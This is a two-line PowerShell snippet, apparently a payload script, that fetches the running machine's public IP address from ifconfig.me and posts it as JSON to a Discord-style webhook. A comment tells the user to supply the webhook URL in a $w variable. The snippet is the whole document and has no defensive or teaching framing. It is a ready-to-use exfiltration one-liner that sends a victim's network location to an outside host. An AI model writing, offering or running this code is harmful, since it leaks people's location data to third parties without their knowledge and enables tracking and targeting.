# must pass it a $w variable with webhook. Add ;$w="your webhook here" at the end
curl ifconfig.me|%{irm $w -Met Post -Bo (@{content=$_}|ConvertTo-Json) -ContentType 'application/json'}
